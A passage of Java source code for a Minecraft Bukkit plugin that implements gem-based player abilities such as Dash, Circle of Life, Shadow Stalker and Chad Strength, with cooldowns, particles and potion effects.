                    switch (customModelData) {
                        case 6:
                        case 26:
                        case 46:
                        case 66:
                        case 86:
                            PuffGemDashCooldown = 30L; // 8 minutes
                            break;
                        default:
                            return;
                    }
                    PuffGem_Power_3_Dash.put(PuffGemDashPlayer.getUniqueId(), PuffGemDashCooldown);
                    PuffGemActionbar(PuffGemDashPlayer);
                    PuffGemDashPlayer.sendMessage(ChatColor.WHITE + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated " + ChatColor.WHITE + "⏫Dash " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill");
                    Vector direction = PuffGemDash.getPlayer().getLocation().getDirection();
                    double dashSpeed = 5.5;
                    Vector dashVector = direction.multiply(dashSpeed);
                    PuffGemDash.getPlayer().setVelocity(dashVector);
                    PuffGemDash.setCancelled(true);
                }
            }
        }
    }


    private void launchUpwards(LivingEntity victim) {
        new BukkitRunnable() {
            private int ticks = 0;
            private final int durationTicks = 20; // Adjust duration as needed

            @Override
            public void run() {
                ticks++;
                if (ticks >= durationTicks) {
                    cancel();
                    return;
                }
                double percent = (double) ticks / durationTicks;
                double newY = 1 * percent * 4;
                Vector currentVelocity = victim.getVelocity();
                victim.setVelocity(new Vector(currentVelocity.getX(), newY, currentVelocity.getZ()));
            }
        }.runTaskTimer(this, 0, 1); // Run every tick
    }


    @EventHandler
    public void Pockets(PlayerInteractEvent Pockets) {
        Player PocketsPlayer = Pockets.getPlayer();
        if (PocketsPlayer.isSneaking() && Pockets.getAction() == Action.RIGHT_CLICK_AIR || PocketsPlayer.isSneaking() && Pockets.getAction() == Action.RIGHT_CLICK_BLOCK) {
            ItemStack WealthGemItem = PocketsPlayer.getInventory().getItemInOffHand();
            if (WealthGem(WealthGemItem) || Wealthgem(WealthGemItem)) {
                Inventory dispenserGui = WealthGemPocketsInventory.getOrDefault(PocketsPlayer.getUniqueId(),
                        Bukkit.createInventory(PocketsPlayer, InventoryType.DISPENSER, "Pockets"));
                WealthGemPocketsInventory.put(PocketsPlayer.getUniqueId(), dispenserGui);
                PocketsPlayer.openInventory(dispenserGui);
            }
        }
    }

    @EventHandler
    public void PocketsInventoryClose(InventoryCloseEvent event) {
        if (event.getInventory().getType() == InventoryType.DISPENSER) {
            Player player = (Player) event.getPlayer();
            WealthGemPocketsInventory.put(player.getUniqueId(), event.getInventory());
        }
    }


    @EventHandler
    public void RichRush(PlayerInteractEvent RichRush) {
        Player RichRushPlayer = RichRush.getPlayer();
        ItemStack WealthGemItem = RichRushPlayer.getInventory().getItemInMainHand();
        if (RichRush.getAction() == Action.RIGHT_CLICK_AIR || RichRush.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (WealthGem(WealthGemItem)) {
                ItemMeta meta = WealthGemItem.getItemMeta();
                PersistentDataContainer data = RichRushPlayer.getPersistentDataContainer();
                boolean RICH_RUSH = data.getOrDefault(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!RICH_RUSH && !DISABLED_GEM) {
                    data.set(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER, 1);
                    int customModelData = meta.getCustomModelData();
                    long RichRushCooldown;
                    switch (customModelData) {
                        case 12:
                        case 32:
                        case 52:
                        case 72:
                        case 92:
                            RichRushCooldown = 1799L;
                            break;
                        default:
                            return;
                    }
                    WealthGem_Power_3_RichRush.put(RichRushPlayer.getUniqueId(), RichRushCooldown);
                    WealthGemActionbar(RichRushPlayer);
                    Particle.DustOptions BlissParticleOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(14, 201, 18), 3);
                    RichRushPlayer.getWorld().spawnParticle(Particle.REDSTONE, RichRushPlayer.getLocation().add(0, 1, 0), 10, 0.5, 0.5, 0.5, 0, BlissParticleOptions, true);

                }
            }
        }
    }


    @EventHandler
    public void CircleOfLife(PlayerInteractEvent PrivilegePrecinct) {
        Player CircleOfLifePlayer = PrivilegePrecinct.getPlayer();
        ItemStack LifeGemItem = CircleOfLifePlayer.getInventory().getItemInMainHand();
        if (PrivilegePrecinct.getAction() == Action.RIGHT_CLICK_AIR || PrivilegePrecinct.getAction() == Action.RIGHT_CLICK_BLOCK) {
            if (LifeGem(LifeGemItem)) {
                ItemMeta meta = LifeGemItem.getItemMeta();
                PersistentDataContainer data = CircleOfLifePlayer.getPersistentDataContainer();
                boolean CIRCLE_OF_LIFE = data.getOrDefault(CɪʀᴄʟᴇOғLɪғᴇ, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!CIRCLE_OF_LIFE && !DISABLED_GEM) {
                    data.set(CɪʀᴄʟᴇOғLɪғᴇ, PersistentDataType.INTEGER, 1);
                    int customModelData = meta.getCustomModelData();
                    long CircleOfLifeCooldown;
                    switch (customModelData) {
                        case 4:
                        case 24:
                            CircleOfLifeCooldown = 180L;
                            break;
                        case 44:
                            CircleOfLifeCooldown = 210L;
                            break;
                        case 64:
                        case 84:
                            CircleOfLifeCooldown = 240L;
                            break;
                        default:
                            return;
                    }
                    LifeGem_Power_3_CircleOfLife.put(CircleOfLifePlayer.getUniqueId(), CircleOfLifeCooldown);
                    LifeGemActionbar(CircleOfLifePlayer);
                    UUID playerId = CircleOfLifePlayer.getUniqueId();
                    if (CircleOfLife.containsKey(playerId)) {
                        CircleOfLife.get(playerId).cancel();
                    }
                    BukkitRunnable task = new BukkitRunnable() {
                        int ticks = 0;
                        int duration = 1700;

                        @Override
                        public void run() {
                            if (ticks >= duration) {
                                this.cancel();
                                CircleOfLife.remove(playerId);
                                return;
                            }
                            double radius = 4.0;
                            Particle.DustOptions dustOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(254, 4, 180), 1.0F);
                            for (int i = 0; i < 2000; i += 3) {
                                double angle = Math.toRadians(i);
                                double x = radius * Math.cos(angle);
                                double z = radius * Math.sin(angle);
                                CircleOfLifePlayer.getWorld().spawnParticle(Particle.REDSTONE, CircleOfLifePlayer.getLocation().add(x, 0, z), 1, dustOptions);
                            }
                            CircleOfLifePlayer.getWorld().spawnParticle(Particle.VILLAGER_HAPPY, CircleOfLifePlayer.getLocation().add(0, 1, 0), 2, 0.5, 0.5, 0.5, 0);
                            repairMendingItem(CircleOfLifePlayer.getInventory().getItemInMainHand());
                            for (ItemStack armorItem : CircleOfLifePlayer.getInventory().getArmorContents()) {
                                repairMendingItem(armorItem);
                                double CircleOfLifeRadius = 4.0;
                                double CircleOfLifeRadiusOuter = 5.0;
                                for (Entity CircleOfLifeEntityVictim : CircleOfLifePlayer.getNearbyEntities(CircleOfLifeRadius, CircleOfLifeRadius, CircleOfLifeRadius)) {
                                    if (CircleOfLifeEntityVictim instanceof LivingEntity && !CircleOfLifeEntityVictim.equals(CircleOfLifePlayer)) {
                                        ((LivingEntity) CircleOfLifeEntityVictim).setMaxHealth(12);
                                        ((LivingEntity) CircleOfLifeEntityVictim).setMaxHealth(20);
                                    }
                                }
                            }
                            ticks += 5;
                        }
                    };
                    task.runTaskTimer(this, 0, 5);
                    CircleOfLife.put(playerId, task);
                    CircleOfLifePlayer.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "Activated " + ChatColor.WHITE + "\uD83D\uDC96" + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "Privilege Precinct");
                }
            }
        }
    }


    private void repairMendingItem(ItemStack item) {
        if (item != null && item.containsEnchantment(Enchantment.MENDING) && item.getDurability() > 0) {
            item.setDurability((short) (item.getDurability() - 5));
        }
    }


    private void HeartDrainerHealthIncrease(Player player) {
        double currentMaxHealth = player.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).getBaseValue();
        double newMaxHealth = Math.min(currentMaxHealth + 8.0, 20.0);
        player.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).setBaseValue(newMaxHealth);
        player.setHealthScale(newMaxHealth);
        player.setHealth(newMaxHealth);
    }

    private void restoreOriginalMaxHealth(Player player) {
        UUID playerId = player.getUniqueId();
        if (HeartDrainerHearts.containsKey(playerId)) {
            double originalMaxHealth = HeartDrainerHearts.get(playerId);
            player.getAttribute(org.bukkit.attribute.Attribute.GENERIC_MAX_HEALTH).setBaseValue(originalMaxHealth);
            player.setHealthScale(originalMaxHealth); // Adjust health bar to original max health
            HeartDrainerHearts.remove(playerId);
        }
    }

    @EventHandler
    public void LifeGemRightClickCrouching(PlayerInteractEvent LifeGemRightClickCrouching) {
        Player LifeGemRightClickCrouchingPlayer = LifeGemRightClickCrouching.getPlayer();
        Action LifeGemRightClickCrouchingPlayerAction = LifeGemRightClickCrouching.getAction();
        ItemStack LifeGemItem = LifeGemRightClickCrouchingPlayer.getInventory().getItemInOffHand();
        Block LifeGemRightClickCrouchingBlock = LifeGemRightClickCrouching.getClickedBlock();
        if (LifeGemRightClickCrouchingBlock == null) return;
        PersistentDataContainer data = LifeGemRightClickCrouchingPlayer.getPersistentDataContainer();
        Location LifeGemRightClickCrouchingBlockLocation = LifeGemRightClickCrouchingBlock.getLocation();
        World LifeGemRightClickCrouchingBlockLocationWorld = LifeGemRightClickCrouchingBlockLocation.getWorld();
        boolean CROUCHING_ON_CROP = data.getOrDefault(Cʀᴏᴜᴄʜɪɴɢ_Oɴ_Cʀᴏᴘ, PersistentDataType.INTEGER, 0) == 1;
        boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
        if (!CROUCHING_ON_CROP && !DISABLED_GEM && LifeGemRightClickCrouchingPlayerAction == Action.RIGHT_CLICK_BLOCK && LifeGemRightClickCrouchingBlock != null && LifeGemRightClickCrouchingPlayer.isSneaking() && LifeGem(LifeGemItem)) {
            Material blockType = LifeGemRightClickCrouchingBlock.getType();
            if (LifeGem(LifeGemItem)) {
                data.set(Cʀᴏᴜᴄʜɪɴɢ_Oɴ_Cʀᴏᴘ, PersistentDataType.INTEGER, 1);
                LifeGemRightClickCrouchingBlockLocationWorld.spawnParticle(Particle.VILLAGER_HAPPY, LifeGemRightClickCrouchingBlockLocation.add(0.5, 0.5, 0.5), 5, 0.5, 0, 0.5, 0.1);

                switch (blockType) {
                    case WHEAT:
                        dropItems(LifeGemRightClickCrouchingBlockLocationWorld, LifeGemRightClickCrouchingBlockLocation, new ItemStack(Material.WHEAT, 1), 5, 0);
                        break;
                    case SUGAR_CANE:
                        dropItems(LifeGemRightClickCrouchingBlockLocationWorld, LifeGemRightClickCrouchingBlockLocation, new ItemStack(Material.SUGAR_CANE, 1), 4, 30);
                        break;
                    case CARROTS:
                        dropItems(LifeGemRightClickCrouchingBlockLocationWorld, LifeGemRightClickCrouchingBlockLocation, new ItemStack(Material.CARROT, 1), 5, 50);
                        break;
                }
            }
        }
    }

    private void dropItems(World world, Location location, ItemStack itemStack, int itemCount, int xpAmount) {
        for (int i = 0; i < itemCount; i++) {
            world.dropItemNaturally(location, itemStack);
        }
        if (xpAmount > 0) {
            for (int i = 0; i < xpAmount; i++) {
                ExperienceOrb xpOrb = world.spawn(location, ExperienceOrb.class);
                xpOrb.setExperience(1);
            }
        }
    }

    @EventHandler
    public void LifeGemEatingGoldenApple(PlayerItemConsumeEvent LifeGemEatingGoldenApple) {
        Player LifeGemEatingGoldenApplePlayer = LifeGemEatingGoldenApple.getPlayer();
        ItemStack LifeGemItem = LifeGemEatingGoldenApplePlayer.getInventory().getItemInOffHand();
        if (LifeGemEatingGoldenApple.getItem().getType() == Material.GOLDEN_APPLE) {
            if (LifeGem(LifeGemItem) || Lifegem(LifeGemItem)) {
                LifeGemEatingGoldenApplePlayer.addPotionEffect(new PotionEffect(PotionEffectType.ABSORPTION, 1200, 1));
            }
        }
    }


    @EventHandler
    public void LifeGemDamageDeadMobs(EntityDamageByEntityEvent LifeGemDamageDeadMobs) {
        if (LifeGemDamageDeadMobs.getDamager() instanceof Player) {
            Entity entity = LifeGemDamageDeadMobs.getEntity();
            Player LifeGemDamageDeadMobsPlayer = (Player) LifeGemDamageDeadMobs.getDamager();
            ItemStack LifeGemItem = LifeGemDamageDeadMobsPlayer.getInventory().getItemInOffHand();
            if (entity instanceof LivingEntity && isUndead((LivingEntity) entity)) {
                if (LifeGem(LifeGemItem)) {
                    Location location = entity.getLocation().add(0, LifeGemDamageAbility, 0);
                    Particle.DustOptions BlissParticleOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(254, 4, 180), 1);
                    location.getWorld().spawnParticle(Particle.REDSTONE, location, 60, 0.5, 0.5, 0.5, 6, BlissParticleOptions, true);
                }
            }
        }
    }

    private boolean isUndead(LivingEntity entity) {
        return LifeGemDamage.contains(entity.getType().toString());
    }


    @EventHandler
    public void BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀ(EntityDamageByEntityEvent BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀ) {
        if (BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀ.getDamager() instanceof Player && BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀ.getEntity() instanceof LivingEntity) {
            Player BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ = (Player) BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀ.getDamager();
            LivingEntity BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ = (LivingEntity) BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀ.getEntity();
            PersistentDataContainer data = BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getPersistentDataContainer();
            boolean sᴛʀᴇɴɢᴛʜ_ᴄɪʀᴄʟᴇ = data.getOrDefault(SᴛʀᴇɴɢᴛʜCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
            boolean sᴛʀᴇɴɢᴛʜ_ʟɪɴᴇ = data.getOrDefault(StrengthLine, PersistentDataType.INTEGER, 0) == 1;
            boolean sᴘᴇᴇᴅ_ᴄɪʀᴄʟᴇ = data.getOrDefault(SᴘᴇᴇᴅCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
            boolean sᴘᴇᴇᴅ_ʟɪɴᴇ = data.getOrDefault(SpeedLine, PersistentDataType.INTEGER, 0) == 1;
            boolean ʟɪғᴇ_ᴄɪʀᴄʟᴇ = data.getOrDefault(LɪғᴇCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
            boolean ʟɪғᴇ_ʟɪɴᴇ = data.getOrDefault(LifeLine, PersistentDataType.INTEGER, 0) == 1;
            boolean ᴡᴇᴀʟᴛʜ_ᴄɪʀᴄʟᴇ = data.getOrDefault(WᴇᴀʟᴛʜCɪʀᴄʟᴇ, PersistentDataType.INTEGER, 0) == 1;
            boolean ᴡᴇᴀʟᴛʜ_ʟɪɴᴇ = data.getOrDefault(WealthLine, PersistentDataType.INTEGER, 0) == 1;
            boolean ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
            ItemStack BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ = BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getInventory().getItemInMainHand();
            if (StrengthGem(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ)) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ.getItemMeta();
                if (!sᴛʀᴇɴɢᴛʜ_ᴄɪʀᴄʟᴇ && !sᴛʀᴇɴɢᴛʜ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    data.set(StrengthLine, PersistentDataType.INTEGER, 1);
                    int StrengthGemCustomModelData = meta.getCustomModelData();
                    long StrengthLineCooldown;
                    switch (StrengthGemCustomModelData) {
                        case 10, 30 -> StrengthLineCooldown = 240L;
                        case 50 -> StrengthLineCooldown = 360L;
                        case 70, 90 -> StrengthLineCooldown = 480L;
                        default -> {
                            return;
                        }
                    }
                    StrengthGem_Power_1_StrengthCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getUniqueId(), StrengthLineCooldown);
                    StrengthGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ);
                    for (PotionEffect effect : BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.getActivePotionEffects()) {
                        BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.removePotionEffect(effect.getType());
                    }
                    BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.addPotionEffect(new PotionEffect(PotionEffectType.WITHER, 800, 1));
                    new ParticleLineTask(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ, BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ, 241, 3, 3).runTaskTimer(this, 0, 2);
                }
            }
            if (SpeedGem(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ)) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ.getItemMeta();
                if (!sᴘᴇᴇᴅ_ᴄɪʀᴄʟᴇ && !sᴘᴇᴇᴅ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    data.set(SpeedLine, PersistentDataType.INTEGER, 1);
                    int customModelData = meta.getCustomModelData();
                    long SpeedLineCooldown;
                    switch (customModelData) {
                        case 8, 28 -> SpeedLineCooldown = 240L;
                        case 48 -> SpeedLineCooldown = 360L;
                        case 68, 88 -> SpeedLineCooldown = 480L;
                        default -> {
                            return;
                        }
                    }
                    SpeedGem_Power_1_SpeedCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getUniqueId(), SpeedLineCooldown);
                    SpeedGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ);
                    BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + " \uD83D\uDD2E" + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have used" + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAFSloth's Sedative" + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + " on " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.getName());
                    BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + " \uD83D\uDD2E" + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You have been affected with" + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAFSloth's Sedative" + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + " by " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getName());
                    for (PotionEffect effect : BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.getActivePotionEffects()) {
                        BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.removePotionEffect(effect.getType());
                    }
                    BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 30 * 30, 3));
                    BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ.addPotionEffect(new PotionEffect(PotionEffectType.SLOW_DIGGING, 20 * 20, 4));
                    new ParticleLineTask(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ, BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ, 254, 253, 23).runTaskTimer(this, 0, 2);
                }
            }
            if (LifeGem(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ)) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ.getItemMeta();
                if (!ʟɪғᴇ_ᴄɪʀᴄʟᴇ && !ʟɪғᴇ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    data.set(LifeLine, PersistentDataType.INTEGER, 1);
                    int LifeGemCustomModelData = meta.getCustomModelData();
                    long LifeLineCooldown;
                    switch (LifeGemCustomModelData) {
                        case 4, 24 -> LifeLineCooldown = 150L;
                        case 44 -> LifeLineCooldown = 175L;
                        case 64, 84 -> LifeLineCooldown = 215L;
                        default -> {
                            return;
                        }
                    }
                    LifeGem_Power_1_LifeCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getUniqueId(), LifeLineCooldown);
                    LifeGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ);
                    new ParticleLineTask(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ, BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ, 254, 4, 180).runTaskTimer(this, 0, 2);

                }
            }
            if (WealthGem(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ)) {
                ItemMeta meta = BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀIᴛᴇᴍ.getItemMeta();
                if (!ᴡᴇᴀʟᴛʜ_ᴄɪʀᴄʟᴇ && !ᴡᴇᴀʟᴛʜ_ʟɪɴᴇ && !ᴅɪsᴀʙʟᴇᴅ_ɢᴇᴍ) {
                    data.set(WealthLine, PersistentDataType.INTEGER, 1);
                    int LifeGemCustomModelData = meta.getCustomModelData();
                    long WealthLineCooldown;
                    switch (LifeGemCustomModelData) {
                        case 12 -> WealthLineCooldown = 230L;
                        case 32 -> WealthLineCooldown = 250L;
                        case 52 -> WealthLineCooldown = 280L;
                        case 72, 92 -> WealthLineCooldown = 320L;
                        default -> {
                            return;
                        }
                    }
                    WealthGem_Power_1_WealthCircle.put(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ.getUniqueId(), WealthLineCooldown);
                    WealthGemActionbar(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ);
                    new ParticleLineTask(BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀAᴛᴛᴀᴄᴋᴇʀ, BʟɪssPᴀʀᴛɪᴄʟᴇLɪɴᴇUsᴇʀVɪᴄᴛɪᴍ, 14, 201, 18).runTaskTimer(this, 0, 2);
                }
            }
        }
    }


    @EventHandler
    public void ShadowStalker(PlayerInteractEvent ShadowStalker) {
        Player player = ShadowStalker.getPlayer();
        ItemStack StrengthGemItem = player.getInventory().getItemInOffHand();
        if (player.isSneaking() && ShadowStalker.getAction() == Action.RIGHT_CLICK_AIR || player.isSneaking() && ShadowStalker.getAction() == Action.RIGHT_CLICK_BLOCK && ShadowStalker.hasItem()) {
            if (StrengthGem(StrengthGemItem) || Strengthgem(StrengthGemItem)) {
                Inventory ShadowStalkerTrack = Bukkit.createInventory(null, 54, ChatColor.DARK_GRAY + "Select Target");
                for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                    ItemStack playerHead = new ItemStack(Material.PLAYER_HEAD, 1);
                    SkullMeta meta = (SkullMeta) playerHead.getItemMeta();
                    meta.setOwningPlayer(onlinePlayer);
                    meta.setDisplayName("§r" + onlinePlayer.getName());
                    playerHead.setItemMeta(meta);
                    ShadowStalkerTrack.addItem(playerHead);
                }
                player.openInventory(ShadowStalkerTrack);
                ShadowStalker.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void ShadowStalkerOpenInventory(InventoryClickEvent event) {
        if (event.getView().getTitle().equals(ChatColor.DARK_GRAY + "Select Target")) {
            event.setCancelled(true);
            ItemStack ShadowStalkerHeadClicked = event.getCurrentItem();
            if (ShadowStalkerHeadClicked != null && ShadowStalkerHeadClicked.getType() == Material.PLAYER_HEAD) {
                SkullMeta meta = (SkullMeta) ShadowStalkerHeadClicked.getItemMeta();
                if (meta != null && meta.hasOwner()) {
                    Player clickedPlayer = Bukkit.getPlayerExact(meta.getOwningPlayer().getName());
                    if (clickedPlayer != null) {
                        ShadowStalkerPlayerHeadNames.put((Player) event.getWhoClicked(), clickedPlayer.getName());
                        Inventory shadowStalkerItems = Bukkit.createInventory(null, InventoryType.HOPPER, ChatColor.DARK_GRAY + "Place Items Belonging To Target");
                        event.getWhoClicked().openInventory(shadowStalkerItems);
                    }
                }
            }
        }
    }

    @EventHandler
    public void ShadowStalkerInventoryClose(InventoryCloseEvent event) {
        if (event.getView().getTitle().equals(ChatColor.DARK_GRAY + "Place Items Belonging To Target")) {
            Player player = (Player) event.getPlayer();
            String playerName = ShadowStalkerPlayerHeadNames.get(player);
            if (playerName != null) {
                Player ShadowStalkerClickedPlayer = Bukkit.getPlayerExact(playerName);
                if (ShadowStalkerClickedPlayer != null) {
                    for (ItemStack item : event.getInventory().getContents()) {
                        if (item != null && item.hasItemMeta()) {
                            ItemMeta itemMeta = item.getItemMeta();
                            if (itemMeta != null && itemMeta.hasLore()) {
                                for (String loreLine : itemMeta.getLore()) {
                                    if (loreLine.contains(playerName)) {
                                        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + ChatColor.RED + "Activated " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "⚔Shadow Stalker");
                                        new ParticleLineTaskLess(player, ShadowStalkerClickedPlayer, 241, 3, 3).runTaskTimer(this, 0, 2);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    public void ChadStrength(PlayerInteractEvent event) {
        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
            Player ChadStrengthPlayer = event.getPlayer();
            ItemStack StrengthGemItem = ChadStrengthPlayer.getInventory().getItemInMainHand();
            if (StrengthGem(StrengthGemItem)) {
                PersistentDataContainer data = ChadStrengthPlayer.getPersistentDataContainer();
                boolean CHAD_STRENGTH = data.getOrDefault(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER, 0) == 1;
                boolean DISABLED_GEM = data.getOrDefault(Disabled_Gem, PersistentDataType.INTEGER, 0) == 1;
                if (!CHAD_STRENGTH && !DISABLED_GEM) {
                    data.set(CʜᴀᴅSᴛʀᴇɴɢᴛʜ, PersistentDataType.INTEGER, 1);
                    data.set(CʜᴀᴅSᴛʀᴇɴɢᴛʜPᴀʀᴛɪᴄʟᴇs, PersistentDataType.INTEGER, 1);
                    ItemMeta meta = StrengthGemItem.getItemMeta();
                    int StrengthGemCcustomModelData = meta.getCustomModelData();
                    long ChadStrengthCooldown;
                    long ChadStrengthParticlesReset;
                    switch (StrengthGemCcustomModelData) {
                        case 10:
                            ChadStrengthCooldown = 150L;
                            ChadStrengthParticlesReset = 40;
                            break;
                        case 30:
                            ChadStrengthCooldown = 180L;
                            ChadStrengthParticlesReset = 40;
                            break;
                        case 50:
                            ChadStrengthCooldown = 210L;
                            ChadStrengthParticlesReset = 40;
                            break;
                        case 70:
                            ChadStrengthCooldown = 250L;
                            ChadStrengthParticlesReset = 40;
                            break;
                        case 90:
                            ChadStrengthCooldown = 300L;
                            ChadStrengthParticlesReset = 40;
                            break;
                        default:
                            return;
                    }
                    StrengthGem_Power_3_ChadStrength.put(ChadStrengthPlayer.getUniqueId(), ChadStrengthCooldown);
                    StrengthGem_Power_8_ChadStrength.put(ChadStrengthPlayer.getUniqueId(), ChadStrengthParticlesReset);
                    StrengthGemActionbar(ChadStrengthPlayer);
